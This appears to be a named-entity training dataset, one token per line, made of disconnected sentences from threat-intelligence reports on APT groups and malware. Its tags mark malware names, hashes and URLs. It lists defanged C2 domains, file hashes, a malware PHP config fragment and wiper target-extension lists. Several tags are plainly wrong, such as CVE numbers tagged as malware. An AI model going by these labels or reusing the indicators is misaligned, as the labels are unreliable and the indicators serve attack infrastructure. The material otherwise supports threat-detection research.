August	O
2014	O
that	O
we	O
observed	O
something	O
which	O
made	O
us	O
wonder	O
if	O
RedOctober	B-malware.unknown
is	O
back	O
for	O
good	O
.	O

This	O
threat	O
advisory	O
describes	O
the	O
functionality	O
of	O
the	O
three	O
malware	O
files	O
to	O
include	O
command	O
inputs	O
and	O
the	O
resulting	O
behavior	O
of	O
the	O
malware	O
.	O

Figure	O
2	O
.	O

We	O
published	O
our	O
list	O
of	O
servers	O
in	O
late	O
August	O
2012	O
,	O
in	O
addition	O
to	O
an	O
analysis	O
of	O
mobile	O
phone	O
versions	O
of	O
FinSpy	B-malware.backdoor
.	O

Figure	O
1	O
shows	O
a	O
sample	O
email	O
,	O
and	O
Figure	O
2	O
show	O
the	O
contents	O
of	O
the	O
HTML	O
file	O
.	O

<	O
?	O
php	O
$	O
uninstall	O
=	O
false	O
;	O
//true	O
to	O
uninstall	O
$	O
buninstall_id	O
=	O
false	O
;	O
//true	O
to	O
uninstall	O
from	O
ID	O
$	O
uninstall_id	O
=	O
'	O
0C124D55	O
'	O
;	O
//ID	O
to	O
uninstall	O
in	O
hex	O
//	O
$	O
uninstall	O
=	O
true	O
;	O
$	O
debug	O
=	O
false	O
;	O
//true	O
to	O
see	O
errors	O
messages	O
FOR	O
TEST	O
ONLY	O
!	O
!	O

Table	O
1	O
.	O

The	O
actual	O
espionage	O
team	O
voluntary	O
chose	O
to	O
use	O
a	O
kind	O
of	O
usual	O
and	O
rather	O
simply	O
botnet	B-malware.ransom
malware	O
in	O
order	O
to	O
distract	O
analysts	O
from	O
seeing	O
a	O
deeper	O
meaning	O
behind	O
this	O
attack	O
and	O
make	O
them	O
disregard	O
it	O
as	O
'	O
daily	O
cybercrime	O
business	O
'	O
.	O

To	O
do	O
The	O
attacker	O
's	O
purpose	O
appears	O
to	O
deploy	O
malicious	O
apps	O
onto	O
the	O
13	O
compromised	O
devices	O
.	O

36	O
.	O

Koadic	B-malware.unknown
commands	O
and	O
output	O
when	O
ANEL	B-malware.backdoor
5.1.2	O
rc1	O
is	O
used	O

All	O
rights	O
reserved	O
.	O

Among	O
them	O
were	O
high	O
ranking	O
diplomats	O
at	O
Israel	O
's	O
Ministry	O
of	O
Foreign	O
Affairs	O
and	O
some	O
well-known	O
Israeli	O
academic	O
researchers	O
specializing	O
in	O
Middle	O
East	O
Studies	O
.	O

Recently	O
it	O
was	O
under	O
the	O
attack	O
exploiting	O
0-day	O
vulnerabilities	O
CVE-2018-8174	B-malware.unknown
.	O

AdvProv.dll	O
is	O
a	O
plug-in	O
to	O
expand	O
functions	O
of	O
Asruex	B-malware.drop
.	O

'	O
Attribution	O
'	O
is	O
notoriously	O
difficult	O
,	O
with	O
the	O
added	O
difficulty	O
that	O
skilled	O
hackers	O
can	O
easily	O
fake	O
clues	O
or	O
evidence	O
to	O
throw	O
people	O
off	O
their	O
tail	O
.	O

For	O
instance	O
,	O
the	O
'	O
qPd0aKJu.vbs	O
'	O
file	O
MD5	O
:	O

The	O
owner	O
of	O
the	O
Gmail	O
account	O
has	O
developed	O
a	O
flashlight	O
app	O
.	O

Version	O
Description	O

WireShark	O
can	O
be	O
used	O
to	O
identify	O
malicious	O
traffic	O
originating	O
on	O
your	O
computer	O
.	O

'	O
Russian	O
Hackers	O
Suspected	O
in	O
French	O
TV	O
Cyberattack	O
.	O
'	O

Ultimately	O
,	O
the	O
module	O
encodes	O
the	O
result	O
with	O
base64	O
and	O
sends	O
it	O
to	O
the	O
C	O
&	O
C	O
server	O
in	O
a	O
POST	O
request	O
.	O

Example	O
observables	O
include	O
:	O
Use	O
of	O
Newly	O
Registered	O
and	O
Low	O
Reputation	O
Infrastructure	O
:	O
The	O
domains	O
utilized	O
in	O
this	O
attack	O
chain	O
are	O
very	O
recently	O
registered	O
domains	O
(	O
Figure	O
12	O
)	O
and	O
leverage	O
low	O
reputation	O
hosting	O
providers	O
and	O
registars	O
that	O
commonly	O
host	O
malicious	O
sites	O
.	O

The	O
dropper	O
in	O
this	O
campaign	O
exploited	O
a	O
known	O
Ghostscript	O
vulnerability	O
,	O
CVE-2017-8291	B-malware.infosteal
.	O

North	O
Korea	O
also	O
utilized	O
Bitcoin	O
for	O
the	O
global	O
WannaCry	B-malware.ransom
ransomware	O
attack	O
in	O
mid-May	O
,	O
forcing	O
victims	O
to	O
pay	O
ransom	O
in	O
Bitcoin	O
.	O

Our	O
threat	O
intelligence	O
systems	O
picked	O
up	O
the	O
fi	O
rst	O
indicators	O
of	O
compromise	O
in	O
July	O
last	O
year	O
,	O
and	O
we	O
have	O
kept	O
an	O
eye	O
on	O
the	O
threat	O
ever	O
since	O
.	O

The	O
attacker	O
can	O
reprogram	O
the	O
SIS	O
logic	O
to	O
allow	O
unsafe	O
conditions	O
to	O
persist	O
.	O

>	O

Malaysia	O
Air	O
Flight	O
MH17	O
destroyed	O
by	O
pro-Russian	O
Separatists	O
Minsk	O
I	O
Ceasefire	O
Signed	O
Video	O
depicting	O
use	O
of	O
30	O
application	O
in	O
eastern	O
Ukraine	O
Pro-Russian	O
forces	O
begin	O
government	O
resources	O
in	O
Eastern	O
Ukraine	O
Earliest	O
public	O
reporting	O
on	O
the	O
Android	O
App	O
developed	O
by	O
the	O
Ukrainian	O
soldier	O
Intrusion	O
against	O
Ukraine	O
's	O
Central	O
Election	O
Commission	O
CyberBerkut	O
Releases	O
Info	O
Associated	O
With	O
Claimed	O
Intrusion	O
into	O
Ukraine	O
's	O
Security	O
Service	O
SBU	O
CyberBerkut	O
Defaces	O
Bellingcat	O
Website	O
Cyber	O
attacks	O
against	O
Ukrainian	O
power	O
stations	O
Attack	O
on	O
Kiev	O
Airport	O
System	O

b4ab538f592082373e9ab96373561713	B-hash

Gathering	O
data	O
from	O
existing	O
APT	O
reports	O
we	O
automated	O
gathering	O
of	O
historical	O
data	O
from	O
known	O
APT	O
domains	O
from	O
the	O
Passive	O
Total	O
API	O
and	O
comparison	O
with	O
the	O
historical	O
data	O
from	O
Operational	B-malware.ransom
Manul	I-malware.ransom
domains	O
.	O

JRat	B-malware.backdoor
Controller	O
screen	O
for	O
an	O
infected	O
host	O

Ravand	O
Cybertech	O
has	O
strong	O
ties	O
to	O
the	O
Iranian	O
regime	O
.	O

One	O
can	O
only	O
speculate	O
on	O
who	O
these	O
submitters	O
are	O
.	O

The	O
first	O
backdoor	O
that	O
the	O
TeleBots	O
group	O
relied	O
heavily	O
on	O
was	O
Python/TeleBot.A	B-malware.backdoor
,	O
which	O
was	O
rewritten	O
from	O
Python	O
in	O
the	O
Rust	O
programming	O
language	O
.	O

This	O
method	O
probably	O
is	O
used	O
to	O
evade	O
detection	O
by	O
AV	O
software	O
,	O
gateway	O
firewalls	O
and	O
malware	O
sandboxes	O
.	O

Exploit	O
Document	O
Filename	O
:	O
Decoy	O
Document	O
Title	O
:	O

The	O
dropper	O
will	O
delete	O
itself	O
at	O
the	O
end	O
of	O
the	O
process	O
.	O

In	O
a	O
report	O
that	O
covers	O
other	O
parts	O
of	O
the	O
campaign	O
,	O
Mcafee	O
attribute	O
it	O
to	O
Gaza	O
Cybergang	O
(	O
AKA	O
Gaza	O
Hacker	O
Team	O
AKA	O
Molerats	O
)	O
.	O

Finally	O
it	O
spawns	O
2	O
system	O
threads	O
.	O

IoT	O
hacks	O
,	O
and	O
operational	O
disruptions	O
.	O

The	O
packets	O
passed	O
between	O
the	O
two	O
endpoints	O
consist	O
of	O
two	O
fi	O
elds	O
,	O
but	O
lack	O
the	O
plaintext	O
header	O
that	O
was	O
typical	O
of	O
Gh0st	B-malware.backdoor
RAT	I-malware.backdoor
in	O
previous	O
versions	O
:	O
1	O
.	O

If	O
a	O
matching	O
directory	O
is	O
found	O
,	O
the	O
dropper	O
does	O
not	O
attempt	O
to	O
deploy	O
the	O
scada.exe	B-malware.unknown
payload	O
.	O

Hwp.exe	O
'	O
with	O
.HWP	O
documents	O
.	O

dwPktSize	O
parameter	O
.	O

T	O
he	O
first	O
instructions	O
in	O
the	O
mapped	O
thumb.db	O
are	O
for	O
a	O
new	O
shikata_	O
ga_	O
nai	O
iteration	O
.	O

This	O
is	O
a	O
MINGW	O
C++	O
keylogger	O
,	O
hosted	O
at	O
:	O

This	O
further	O
validates	O
our	O
scanning	O
results	O
,	O
and	O
calls	O
into	O
question	O
Gamma	O
's	O
claim	O
that	O
such	O
servers	O
are	O
'	O
not	O
...	O
from	O
the	O
FinFisher	B-malware.backdoor
product	O
line	O
.	O
'	O

SMB	O
hacking	O
tools	O
:	O
Used	O
in	O
conjunction	O
with	O
other	O
tools	O
to	O
traverse	O
target	O
networks	O
.	O

It	O
looks	O
like	O
the	O
Darkhotel	B-malware.infosteal
APT	O
may	O
have	O
been	O
using	O
the	O
leaked	O
HackingTeam	O
Flash	O
0day	O
to	O
target	O
specific	O
systems	O
.	O

After	O
a	O
successful	O
login	O
,	O
the	O
controller	O
returns	O
an	O
acknowledgment	O
to	O
the	O
victim	O
with	O
the	O
correct	O
header	O
using	O
the	O
packet	O
flag	O
which	O
it	O
is	O
programmed	O
to	O
verify	O
,	O
as	O
seen	O
in	O
Figure	O
2	O
.	O

Reports	O
of	O
the	O
group	O
's	O
activity	O
in	O
Asia	O
date	O
back	O
to	O
2012	O
,	O
attacking	O
Chinese	O
entities	O
.	O

The	O
other	O
malware	O
family	O
used	O
in	O
this	O
campaign	O
is	O
the	O
commercially	O
available	O
RAT	B-malware.unknown
known	O
as	O
'	O
Bandook	B-malware.unknown
.	O
'	O

In	O
recent	O
weeks	O
,	O
Unit	O
42	O
has	O
been	O
analyzing	O
delivery	O
documents	O
used	O
in	O
spear-phishing	O
attacks	O
that	O
drop	O
a	O
custom	O
downloader	O
used	O
in	O
cyber	O
espionage	O
attacks	O
.	O

The	O
hook	O
installed	O
by	O
ZxShell	B-malware.backdoor
implements	O
one	O
of	O
its	O
filtering	O
routine	O
.	O

A	O
similar	O
service	O
,	O
vicp.net	O
,	O
is	O
also	O
seen	O
in	O
many	O
of	O
the	O
domains	O
.	O

On	O
a	O
Windows	O
machine	O
,	O
the	O
netsvc	O
group	O
contains	O
names	O
of	O
both	O
existing	O
and	O
non-existing	O
services	O
.	O

This	O
document	O
contains	O
additional	O
Comment	O
Crew	O
indicators	O
of	O
compromise	O
that	O
were	O
seen	O
in	O
the	O
past	O
year	O
.	O

The	O
following	O
is	O
an	O
example	O
of	O
one	O
of	O
these	O
functions	O
–	O
note	O
it	O
even	O
has	O
string	O
references	O
to	O
the	O
source	O
code	O
file	O
name	O
.	O

In	O
the	O
latest	O
version	O
of	O
the	O
dropper	O
,	O
the	O
lure	O
pdf	O
is	O
saved	O
to	O
the	O
user	O
's	O
%	O
TEMP	O
%	O
folder	O
with	O
an	O
'	O
~st	O
'	O
prefix	O
and	O
random	O
number	O
,	O
followed	O
by	O
a	O
'	O
.pdf	O
'	O
extension	O
.	O

Interestingly	O
,	O
the	O
binary	O
contains	O
a	O
lot	O
of	O
verbose	O
error	O
messages	O
,	O
allowing	O
us	O
to	O
see	O
Dino	B-malware.backdoor
's	O
developers	O
'	O
choice	O
of	O
wording	O
.	O

At	O
the	O
moment	O
,	O
Avast	O
is	O
one	O
of	O
few	O
mobile	O
antivirus	O
providers	O
detecting	O
the	O
threat	O
.	O

Though	O
the	O
data	O
of	O
module	O
3	O
started	O
with	O
'	O
MZ	O
'	O
,	O
it	O
does	O
not	O
belong	O
to	O
PE	O
files	O
.	O

Even	O
though	O
the	O
targets	O
that	O
are	O
known	O
by	O
now	O
are	O
rather	O
high-level	O
targets	O
,	O
the	O
malware	O
code	O
as	O
well	O
as	O
its	O
features	O
is	O
not	O
advanced	O
.	O

New	O
Countries	O

Minerva	O
brings	O
a	O
completely	O
new	O
paradigm	O
to	O
the	O
malware	O
detection	O
problem	O
,	O
focusing	O
on	O
preventing	O
malware	O
execution	O
by	O
using	O
the	O
malware	O
's	O
strengths	O
against	O
it	O
.	O

In	O
terms	O
of	O
the	O
size	O
of	O
the	O
infrastructure	O
used	O
in	O
the	O
campaign	O
using	O
the	O
tools	O
described	O
,	O
it	O
's	O
also	O
fairly	O
small	O
,	O
as	O
shown	O
on	O
our	O
Maltego	O
graph	O
.	O

Users	O
can	O
protect	O
themselves	O
from	O
such	O
attacks	O
by	O
disabling	O
Office	O
macros	O
in	O
their	O
settings	O
and	O
also	O
by	O
being	O
more	O
vigilant	O
when	O
enabling	O
macros	O
(	O
especially	O
when	O
prompted	O
)	O
in	O
documents	O
,	O
even	O
if	O
such	O
documents	O
are	O
from	O
seemingly	O
trusted	O
sources	O
.	O

Thus	O
,	O
social	O
engineering	O
techniques	O
would	O
be	O
involved	O
.	O

Data	O
.....	O
data.i	O
6d	O
61	O
67	O
65	O
05	O
62	O
79	O
74	O
65	O
73	O
01	O
02	O
02	O
02	O
00	O
00	O
mage.bytes	O
......	O
00	O
06	O
03	O
00	O
00	O
00	O
64	O
31	O
30	O
32	O
36	O
32	O
32	O
30	O
32	O
31	O
......	O
d102622021	O
46	O
32	O
30	O
30	O
33	O
32	O
34	O
30	O
33	O
30	O
30	O
33	O
36	O
32	O
44	O
36	O
F2003240300362D6	O
34	O
33	O
38	O
30	O
42	O
34	O
33	O
35	O
37	O
31	O
30	O
31	O
36	O
33	O
31	O
33	O
4380B43571016313	O
44	O
33	O
39	O
30	O
30	O
32	O
45	O
32	O
31	O
30	O
36	O
30	O
38	O
30	O
43	O
30	O
D39002E2106080C0	O
46	O
32	O
35	O
33	O
38	O
30	O
37	O
30	O
38	O
30	O
35	O
37	O
41	O
37	O
35	O
33	O
F25380708057A753	O
33	O
30	O
44	O
37	O
37	O
32	O
36	O
33	O
35	O
33	O
31	O
36	O
39	O
33	O
45	O
34	O
30D77263531693E4	O
34	O
37	O
45	O
31	O
35	O
35	O
38	O
37	O
38	O
35	O
43	O
0a	O
0a	O
0b	O
47E1558785C	O
...	O

Across	O
the	O
stages	O
of	O
these	O
campaigns	O
,	O
we	O
have	O
observed	O
the	O
use	O
of	O
several	O
tactics	O
and	O
techniques	O
to	O
evade	O
detection	O
and	O
deliver	O
the	O
malicious	O
payload	O
.	O

This	O
is	O
a	O
driver	O
file	O
which	O
loads	O
a	O
main	O
module	O
designed	O
as	O
an	O
encrypted	O
library	O
.	O

checkFolders	O

ComServer6	O
:	O
hXXp://dneprorudnoe.info//...	O
[	O
]	O
...	O
/postal.php	O
STR	O

2b8c79678fa970ca4e229121e3de206f	B-hash
5e4b7268606d6c98d00874431d39c34971149200	B-hash

Our	O
detection	O
is	O
Android	O
:	O
SpyAgent-YP	O
[	O
Trj	O
]	O
.	O

There	O
is	O
strong	O
evidence	O
of	O
a	O
Vietnamese	O
FinSpy	B-malware.backdoor
Mobile	O
Campaign	O
.	O

•	O
Ensure	O
that	O
you	O
are	O
progressing	O
towards	O
being	O
able	O
to	O
attest	O
against	O
the	O
SWIFT	O
27	O
controls	O
.	O

Notice	O
the	O
'	O
$	O
DoIt	O
'	O
string	O
,	O
which	O
is	O
usually	O
indicative	O
of	O
a	O
Cobalt	O
Strike	O
payload	O
.	O

Web	O
.	O

return	O
0	O
;	O
32	O
}	O

McAfee	O
Vulnerability	O
Coverage	O
not	O
warranted	O
at	O
this	O
time	O
MNAC	O
2.x	O
Coverage	O
not	O
warranted	O
at	O
this	O
time	O
McAfee	O
Remediation	O
Malware	O
coverage	O
is	O
out	O
of	O
scope	O
.	O

After	O
acquiring	O
the	O
MFT	O
using	O
FTK	O
,	O
EnCase	O
,	O
or	O
other	O
means	O
,	O
FireEye	O
recommends	O
using	O
mftdump	O
.	O

These	O
tools	O
are	O
used	O
to	O
further	O
compromise	O
the	O
organization	O
by	O
attacking	O
other	O
hosts	O
inside	O
the	O
targets	O
network	O
.	O

APT28	B-malware.infosteal
gains	O
access	O
to	O
an	O
International	O
Olympic	O
Committee	O
account	O
created	O
specifically	O
for	O
the	O
2016	O
Olympic	O
Games	O
,	O
and	O
views	O
and	O
downloads	O
athlete	O
data	O
.	O

2016	O
.	O

This	O
payload	O
is	O
available	O
in	O
a	O
variety	O
of	O
languages	O
such	O
as	O
ASP	O
,	O
ASPX	O
,	O
PHP	O
,	O
JSP	O
,	O
and	O
CFM	O
.	O

https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2018-8174	B-url.normal
360	O
Helios	O
Team	O
is	O
the	O
APT	O
(	O
Advanced	O
Persistent	O
Attack	O
)	O
research	O
and	O
analysis	O
team	O
in	O
Qihoo	O
360	O
.	O

There	O
are	O
a	O
lot	O
of	O
versions	O
available	O
in	O
the	O
underground	O
market	O
.	O

Table	O
5	O
:	O
'	O
system_web.aspx	B-malware.backdoor
'	O
Authentication	O
Code	O
First	O
,	O
the	O
code	O
checks	O
if	O
a	O
cookie	O
by	O
the	O
name	O
of	O
cp	O
exists	O
.	O

Among	O
them	O
is	O
SecurityPasswordAES	O
.	O

If	O
you	O
are	O
interested	O
in	O
reading	O
more	O
about	O
the	O
BlackEnergy	O
APT	O
,	O
be	O
sure	O
to	O
check	O
our	O
previous	O
blogs	O
on	O
the	O
topic	O
:	O
Going	O
back	O
to	O
the	O
hunt	O
for	O
similarities	O
,	O
here	O
's	O
how	O
the	O
targeted	O
extensions	O
lists	O
looks	O
in	O
ExPetr	O
and	O
a	O
version	O
of	O
a	O
wiper	O
used	O
by	O
the	O
BE	O
APT	O
group	O
in	O
2015	O
:	O
ExPetr	O
2015	O
BlackEnergy	O
wiper	O
sample	O
3ds	O
,	O
.7z	O
,	O
.accdb	O
,	O
.ai	O
,	O
.asp	O
,	O
.aspx	O
,	O
.avhd	O
,	O
.back	O
,	O
.bak	O
,	O
.c	O
,	O
.cfg	O
,	O
.conf	O
,	O
.cpp	O
,	O
.cs	O
,	O
.ctl	O
,	O
.dbf	O
,	O
.disk	O
,	O
.djvu	O
,	O
.doc	O
,	O
.docx	O
,	O
.dwg	O
,	O
.eml	O
,	O
.fdb	O
,	O
.gz	O
,	O
.h	O
,	O
.hdd	O
,	O
.kdbx	O
,	O
.mail	O
,	O
.mdb	O
,	O
.msg	O
,	O
.nrg	O
,	O
.ora	O
,	O
.ost	O
,	O
.ova	O
,	O
.ovf	O
,	O
.pdf	O
,	O
.php	O
,	O
.pmf	O
,	O
.ppt	O
,	O
.pptx	O
,	O
.pst	O
,	O
.pvi	O
,	O
.py	O
,	O
.pyc	O
,	O
.rar	O
,	O
.rtf	O
,	O
.sln	O
,	O
.sql	O
,	O
.tar	O
,	O
.vbox	O
,	O
.vbs	O
,	O
.vcb	O
,	O
.vdi	O
,	O
.vfd	O
,	O
.vmc	O
,	O
.vmdk	O
,	O
.vmsd	O
,	O
.vmx	O
,	O
.vsdx	O
,	O
.vsv	O
,	O
.work	O
,	O
.xls	O
.3ds	O
,	O
.7z	O
,	O
.accdb	O
,	O
.accdc	O
,	O
.ai	O
,	O
.asp	O
,	O
.aspx	O
,	O
.avhd	O
,	O
.back	O
,	O
.bak	O
,	O
.bin	O
,	O
.bkf	O
,	O
.cer	O
,	O
.cfg	O
,	O
.conf	O
,	O
.crl	O
,	O
.crt	O
,	O
.csr	O
,	O
.csv	O
,	O
.dat	O
,	O
.db3	O
,	O
.db4	O
,	O
.dbc	O
,	O
.dbf	O
,	O
.dbx	O
,	O
.djvu	O
,	O
.doc	O
,	O
.docx	O
,	O
.dr	O
,	O
.dwg	O
,	O
.dxf	O
,	O
.edb	O
,	O
.eml	O
,	O
.fdb	O
,	O
.gdb	O
,	O
.git	O
,	O
.gz	O
,	O
.hdd	O
,	O
.ib	O
,	O
.ibz	O
,	O
.io	O
,	O
.jar	O
,	O
.jpeg	O
,	O
.jpg	O
,	O
.jrs	O
,	O
.js	O
,	O
.kdbx	O
,	O
.key	O
,	O
.mail	O
,	O
.max	O
,	O
.mdb	O
,	O
.mdbx	O
,	O
.mdf	O
,	O
.mkv	O
,	O
.mlk	O
,	O
.mp3	O
,	O
.msi	O
,	O
.my	O
,	O
.myd	O
,	O
.nsn	O
,	O
.oda	O
,	O
.ost	O
,	O
.ovf	O
,	O
.p7b	O
,	O
.p7c	O
,	O
.p7r	O
,	O
.pd	O
,	O
.pdf	O
,	O
.pem	O
,	O
.pfx	O
,	O
.php	O
,	O
.pio	O
,	O
.piz	O
,	O
.png	O
,	O
.ppt	O
,	O
.pptx	O
,	O
.ps	O
,	O
.ps1	O
,	O
.pst	O
,	O
.pvi	O
,	O
.pvk	O
,	O
.py	O
,	O
.pyc	O
,	O
.rar	O
,	O
.rb	O
,	O
.rtf	O
,	O
.sdb	O
,	O
.sdf	O
,	O
.sh	O
,	O
.sl3	O
,	O
.spc	O
,	O
.sql	O
,	O
.sqlite	O
,	O
.sqlite3	O
,	O
.tar	O
,	O
.tiff	O
,	O
.vbk	O
,	O
.vbm	O
,	O
.vbox	O
,	O
.vcb	O
,	O
.vdi	O
,	O
.vfd	O
,	O
.vhd	O
,	O
.vhdx	O
,	O
.vmc	O
,	O
.vmdk	O
,	O
.vmem	O
,	O
.vmfx	O
,	O
.vmsd	O
,	O
.vmx	O
,	O
.vmxf	O
,	O
.vsd	O
,	O
.vsdx	O
,	O
.vsv	O
,	O
.wav	O
,	O
.wdb	O
,	O
.xls	O
,	O
.xlsx	O
,	O
.xvd	O
,	O
.zip	O
Obviously	O
,	O
the	O
lists	O
are	O
similar	O
in	O
composition	O
and	O
formatting	O
,	O
but	O
not	O
identical	O
.	O

If	O
an	O
unknown	O
individual	O
claims	O
to	O
be	O
from	O
a	O
legitimate	O
organization	O
,	O
try	O
to	O
verify	O
his	O
or	O
her	O
identity	O
directly	O
with	O
the	O
company	O
.	O

e2627a887898b641db720531258fd133	O

Public	O
disclosures	O
may	O
result	O
in	O
an	O
immediate	O
change	O
in	O
APT12	O
's	O
tools	O
.	O

This	O
2nd	O
stage	O
payload	O
DLL	O
contained	O
within	O
the	O
assembly	O
is	O
30,720	O
bytes	O
in	O
size	O
and	O
encoded	O
with	O
XOR	O
56	O
:	O

'	O
e53bd956c4ef79d54b4860e74c68e6d93a49008034afb42b092ea19344309914.exe	O
'	O

The	O
handshake	O
begins	O
when	O
the	O
client	O
sends	O
a	O
64	O
byte	O
random	O
buffer	O
with	O
the	O
3	O
(	O
offset	O
12	O
)	O
and	O
8	O
(	O
offset	O
32	O
)	O
DWORDs	O
defined	O
as	O
:	O

It	O
is	O
obvious	O
that	O
rtniczw.sys	O
was	O
intended	O
for	O
some	O
other	O
use	O
.	O

This	O
is	O
also	O
the	O
case	O
of	O
a	O
custom-built	O
piece	O
of	O
malware	O
that	O
we	O
have	O
been	O
monitoring	O
for	O
several	O
months	O
as	O
it	O
wrought	O
havoc	O
in	O
Asia	O
.	O

While	O
we	O
do	O
not	O
have	O
any	O
knowledge	O
of	O
who	O
the	O
actual	O
Lazarus	O
attackers	O
are	O
,	O
the	O
data	O
collected	O
from	O
the	O
backend	O
systems	O
gives	O
us	O
some	O
insights	O
into	O
the	O
internet	O
usage	O
patterns	O
of	O
systems	O
likely	O
owned	O
by	O
Lazarus	O
group	O
members	O
.	O

Starts	O
in	O
Function	O
:	O
cef_initialize	O

When	O
Unit	O
42	O
used	O
the	O
Palo	O
Alto	O
Networks	O
AutoFocus	O
threat	O
intelligence	O
service	O
to	O
locate	O
additional	O
Cmstar	B-malware.unknown
samples	O
,	O
we	O
found	O
several	O
with	O
C2	O
domains	O
that	O
also	O
had	O
the	O
same	O
original	O
registrant	O
:	O
links.dogsforhelp[.]com	B-url.unknown
three.earewq[.]com	B-url.unknown
question.eboregi[.]com	B-url.unknown
here.pechooin[.]com	B-url.unknown
sarey.phdreport[.]com	B-url.unknown
bakler.featurvoice[.]com	B-url.unknown
The	O
only	O
known	O
Cmstar	B-malware.unknown
C2	O
domain	O
not	O
initially	O
registered	O
by	O
the	O
email	O
address	O
was	O
help.ubxpi0s[.]com	B-url.unknown
.	O

Copy	O
the	O
DLL	O
file	O
in	O
the	O
AppData	O
directory	O
to	O
the	O
System32	O
directory	O
through	O
the	O
COM	O
interface	O
and	O
name	O
it	O
msfte.dll	O
and	O
NTWDBLIB.dll	O
.	O

After	O
this	O
is	O
complete	O
you	O
will	O
be	O
able	O
to	O
add	O
the	O
image	O
into	O
the	O
forensic	O
program	O
.	O

In	O
every	O
case	O
we	O
have	O
found	O
,	O
the	O
main	O
component	O
is	O
a	O
DLL	O
dropped	O
by	O
an	O
executable	O
compiled	O
minutes	O
after	O
the	O
DLL	O
.	O

WindowsDefender.ini	O
–	O
The	O
Base64	O
encoded	O
and	O
obfuscated	O
PowerShell	O
script	O
.	O

However	O
,	O
no	O
public	O
analysis	O
reports	O
of	O
SOUNDBITE	B-malware.backdoor
is	O
available	O
to	O
the	O
time	O
of	O
writing	O
this	O
report	O
.	O

The	O
new	O
xor	O
encoding	O
byte	O
is	O
0x5B	O
.	O

Each	O
of	O
those	O
commands	O
can	O
take	O
one	O
or	O
more	O
arguments	O
.	O

To	O
copy	O
memory	O
,	O
the	O
memcpy	O
function	O
is	O
invoked	O
.	O

https://github.com/fireeye/tools/tree/master/malware/Xtreme	B-url.normal
%	I-url.normal
20RAT	I-url.normal

No	O
public	O
analysis	O
was	O
found	O
except	O
the	O
mention	O
in	O
Kaspersky	O
's	O
report	O
of	O
a	O
custom	O
backdoor	O
,	O
so	O
CIRCL	O
took	O
one	O
of	O
the	O
known	O
samples	O
and	O
started	O
this	O
analysis	O
.	O

According	O
to	O
Sherstuk	O
's	O
interviews	O
with	O
the	O
press	O
,	O
over	O
9000	O
artillery	O
personnel	O
have	O
been	O
using	O
the	O
application	O
in	O
Ukrainian	O
military	O
.	O

The	O
analysts	O
involved	O
were	O
able	O
to	O
identify	O
command	O
and	O
control	O
(	O
C2	O
)	O
servers	O
,	O
dropper	O
and	O
installation	O
methods	O
,	O
means	O
of	O
persistence	O
,	O
and	O
identify	O
the	O
attack	O
tools	O
that	O
are	O
core	O
to	O
the	O
RAT	B-malware.drop
's	O
purpose	O
.	O

In	O
order	O
to	O
establish	O
a	O
valid	O
communication	O
channel	O
between	O
the	O
server	O
variant	O
and	O
a	O
controlling	O
client	O
,	O
a	O
specific	O
handshake	O
is	O
required	O
.	O

So	O
,	O
even	O
more	O
interesting	O
than	O
the	O
shift	O
eastward	O
and	O
other	O
targeting	O
overlap	O
,	O
is	O
that	O
the	O
specific	O
target	O
system	O
in	O
China	O
was	O
previously	O
a	O
Grey	O
Lambert	O
target	O
.	O

While	O
this	O
may	O
be	O
a	O
possibility	O
,	O
at	O
present	O
there	O
is	O
n't	O
enough	O
evidence	O
to	O
support	O
that	O
hypothesis	O
.	O

File	O
Name	O
:	O
netsat.exe	O
File	O
Size	O
:	O
43520	O
bytes	O
MD5	O
:	O
eb8399483b55f416e48a320d68597d72	B-hash
Previous	O
analysis	O
results	O
indicated	O
netsat.exe	O
retrieved	O
commands	O
from	O
an	O
encrypted	O
file	O
named	O
netwn.drv	O
resident	O
in	O
the	O
CSIDL_WINDOWS\msagent\	O
directory	O
.	O

The	O
unchecked	O
global	O
proliferation	O
of	O
products	O
like	O
FinFisher	B-malware.backdoor
makes	O
a	O
strong	O
case	O
for	O
policy	O
debate	O
about	O
surveillance	O
software	O
and	O
the	O
commercialization	O
of	O
offensive	O
cyber-capabilities	O
.	O

False	O
flags	O
are	O
becoming	O
more	O
common	O
in	O
malware	O
,	O
both	O
sophisticated	O
and	O
simple	O
.	O

As	O
usual	O
,	O
the	O
best	O
defense	O
against	O
targeted	O
attacks	O
is	O
a	O
multi-layered	O
approach	O
.	O

These	O
temporary	O
PRT	O
files	O
are	O
then	O
submitted	O
for	O
printing	O
by	O
using	O
another	O
executable	O
file	O
called	O
nroff.exe	O
,	O
a	O
legitimate	O
tool	O
from	O
the	O
SWIFT	O
software	O
suite	O
.	O

|	O
0000d600	O
65	O
78	O
65	O
00	O
53	O
68	O
61	O
64	O
6f	O
77	O
54	O
65	O
63	O
68	O
20	O
52	O
|	O
exe.ShadowTech	B-malware.infosteal
R	I-malware.infosteal
|	O
0000d610	O
61	O
74	O
00	O
3c	O
4d	O
6f	O
64	O
75	O
6c	O
65	O
3e	O
00	O
01	O
00	O
03	O
00	O
|	O
at	O
.	O

Re-use	O
of	O
domains	O
and	O
IPs	O
across	O
campaigns	O
-	O
Quite	O
a	O
few	O
domains	O
and	O
IPs	O
that	O
were	O
observed	O
in	O
Operation	O
Cobalt	O
Kitty	O
were	O
found	O
in-the-wild	O
,	O
attacking	O
other	O
targets	O
.	O

It	O
is	O
that	O
hackers	O
are	O
becoming	O
increasingly	O
sophisticated	O
and	O
able	O
to	O
generate	O
new	O
threats	O
faster	O
than	O
ever	O
before	O
.	O

The	O
text-based	O
payload	O
is	O
so	O
simple	O
and	O
short	O
that	O
an	O
attacker	O
could	O
type	O
it	O
by	O
hand	O
right	O
on	O
the	O
target	O
server—no	O
file	O
transfer	O
needed	O
.	O

This	O
is	O
the	O
first	O
time	O
that	O
Bankshot	O
has	O
been	O
tied	O
directly	O
to	O
financial-related	O
hacking	O
and	O
the	O
first	O
time	O
it	O
has	O
been	O
used	O
since	O
November	O
2017	O
.	O

Bot	O
:	O

Figure	O
17	O
:	O
Results	O
of	O
multiple	O
anti-virus	O
engine	O
inspections	O
showing	O
China	O
Chopper	O
coming	O
up	O
clean	O

In	O
this	O
case	O
the	O
available	O
DLLs	O
can	O
have	O
the	O
names	O
:	O
We	O
were	O
able	O
to	O
obtain	O
the	O
first	O
three	O
DLLs	O
,	O
which	O
were	O
located	O
at	O
the	O
URL	O
hxxp://axroot.com/plg10/.	B-url.unknown

Attached	O
to	O
this	O
email	O
was	O
a	O
malicious	O
Microsoft	O
Word	O
document	O
(	O
MD5	O
:	O
f6fafb7c30b1114befc93f39d0698560	B-hash
)	O
that	O
exploited	O
